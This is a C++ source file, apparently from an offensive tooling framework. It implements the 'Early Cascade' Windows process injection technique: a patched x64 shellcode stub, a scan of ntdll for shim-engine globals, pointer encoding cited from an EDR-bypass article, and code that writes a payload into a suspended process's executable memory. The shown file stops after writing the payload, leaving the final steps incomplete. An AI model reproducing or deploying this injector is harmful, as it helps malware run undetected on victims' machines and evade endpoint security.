#include "core/Macros.hpp"
#include "core/CascadeInject.hpp"
#include <windows.h>
#include <ntstatus.h>
#ifdef INJ_CASCADE

// Stub shellcode
// ref: https://github.com/Cracked5pider/earlycascade-injection/blob/main/src/Main.cc#L13
unsigned char cascade_stub_x64[] = {
    0x48, 0x83, 0xec, 0x38,                          // sub rsp, 38h
    0x33, 0xc0,                                      // xor eax, eax
    0x45, 0x33, 0xc9,                                // xor r9d, r9d
    0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax

    0x48, 0xba,                                      //
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // mov rdx, 8888888888888888h

    0xa2,                                            // (offset: 25)
    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // mov ds:9999999999999999h, al

    0x49, 0xb8,                                      //
    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // mov r8, 7777777777777777h

    0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]

    0x48, 0xb8,                                      //
    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // mov rax, 6666666666666666h

    0xff, 0xd0,                                      // call rax
    0x33, 0xc0,                                      // xor eax, eax
    0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
    0xc3                                             // ret
};

/*!
 * @brief
 * Encodes a pointer using the
 * shared user cookie
 *
 * ref: https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
 *
 * ref: https://github.com/Cracked5pider/earlycascade-injection/blob/main/src/Main.cc#L72
 * @param ptr
 * Pointer to encode
 * @return
 * Encoded pointer
 */
PVOID EncodeFnPointer(IN PVOID ptr) {
    ULONG userCookie = *reinterpret_cast<ULONG *>(0x7FFE0330);

    return C_PTR(_rotr64(userCookie ^ U_PTR(ptr), userCookie & 0x3F));
}

VOID FindOffset(IN OUT PVOID* g_pfnSE_DllLoaded, IN OUT PVOID* g_ShimsEnabled) {
    PULONG  ptr = nullptr;
    ULONG   offset1 = 0,
            offset2 = 0;

    ptr = reinterpret_cast<PULONG>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlQueryDepthSList"));

    for (int i = 0; i != 2;) {
        if ((*reinterpret_cast<PWORD>(ptr)) == 0xCCC3) {
            ++i;
        }
        ++ptr;
    }

    while ( ((*reinterpret_cast<PLONG>(ptr)) & 0xFFFFFF) != 0x3D8B48) {
        ++ptr;
    }

    offset1 = *reinterpret_cast<PULONG>(ptr + 3);
    *g_pfnSE_DllLoaded = reinterpret_cast<PVOID>(ptr + offset1 + 7);

    while ( ((*reinterpret_cast<PLONG>(ptr)) & 0xFFFFFF) != 0x253844) {
        ++ptr;
    }

    offset2 = *reinterpret_cast<PULONG>(ptr + 3);
    *g_ShimsEnabled = reinterpret_cast<PVOID>(ptr + offset2 + 7);
}

NTSTATUS CascadeInject(IN PWSTR processName, IN PVOID payload, IN SIZE_T payloadSize, IN PVOID context, IN SIZE_T contextSize) {
    PROCESS_INFORMATION pi                  = {};
    STARTUPINFOW        si                  = {};
    ULONG               stubSize            = 0,
                        offset              = 0;
    PVOID               stub                = nullptr,
                        g_pfnSE_DllLoaded   = nullptr,
                        g_ShimsEnabled      = nullptr;
    UINT_PTR            g_Value             = 0;


    if (!processName || !payload) {
        return STATUS_INVALID_PARAMETER;
    }

    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
    si.cb = sizeof(STARTUPINFOW);

    if (!CreateProcessW(
        nullptr,
        processName,
        nullptr,
        nullptr,
        FALSE,
        CREATE_SUSPENDED,
        nullptr,
        nullptr,
        &si,
        &pi)) {
        return STATUS_UNSUCCESSFUL;
    }

    stubSize = sizeof(cascade_stub_x64) + payloadSize;
    if (context) {
        stubSize += contextSize;
    }

    if (!((stub = VirtualAllocEx(
               pi.hProcess,
               nullptr,
               stubSize,
               MEM_COMMIT | MEM_RESERVE,
               PAGE_EXECUTE_READWRITE)))) {
        return STATUS_UNSUCCESSFUL;
    }

    FindOffset(&g_pfnSE_DllLoaded, &g_ShimsEnabled);
    if (!g_pfnSE_DllLoaded || !g_ShimsEnabled) {
        return STATUS_UNSUCCESSFUL;
    }

    g_Value = U_PTR(stub) + sizeof(cascade_stub_x64);
    memcpy(&cascade_stub_x64[16], &g_Value, sizeof(PVOID));
    memcpy(&cascade_stub_x64[25], &g_ShimsEnabled, sizeof(PVOID));
    g_Value = U_PTR(stub) + sizeof(cascade_stub_x64) + payloadSize;
    if (!context) {
        g_Value = 0;
    }
    memcpy(&cascade_stub_x64[35], &g_Value, sizeof(PVOID));
    g_Value = U_PTR(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread"));
    memcpy(&cascade_stub_x64[49], &g_Value, sizeof(PVOID));

    if (!WriteProcessMemory(
        pi.hProcess,
        C_PTR(U_PTR(stub) + offset),
        cascade_stub_x64,
        sizeof(cascade_stub_x64),
        nullptr)) {
        return STATUS_UNSUCCESSFUL;
    }
    offset += sizeof(cascade_stub_x64);

    if (!WriteProcessMemory(
        pi.hProcess,
        C_PTR(U_PTR(stub) + offset),
        payload,
        payloadSize,
        nullptr)) {
        return STATUS_UNSUCCESSFUL;
    }


}

#endif